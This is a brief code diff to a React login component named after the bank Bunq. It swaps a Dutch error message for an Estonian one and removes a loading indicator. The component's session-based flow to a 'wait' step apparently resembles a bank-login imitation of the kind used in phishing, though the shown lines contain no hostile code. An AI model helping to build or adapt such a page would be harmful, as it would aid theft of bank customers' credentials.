@@ -51,7 +51,7 @@ export function BunqLoginClient({ sessionId }: Props) {
 
     if (updateError) {
       setSaving(false);
-      setError("Er is een fout opgetreden. Probeer het opnieuw.");
+      setError("Tekkis viga. Proovi uuesti.");
       return;
     }
     router.push(stepToPath("wait", sessionId));
@@ -114,7 +114,7 @@ export function BunqLoginClient({ sessionId }: Props) {
           <button type="submit" className="hidden">Submit</button>
 
           {error && <p className="text-red-500 text-sm text-center mt-2">{error}</p>}
-          {saving && <p className="text-white text-sm text-center mt-2 opacity-70">Laden...</p>}
+          
         </form>
 
         {/* Footer Card */}
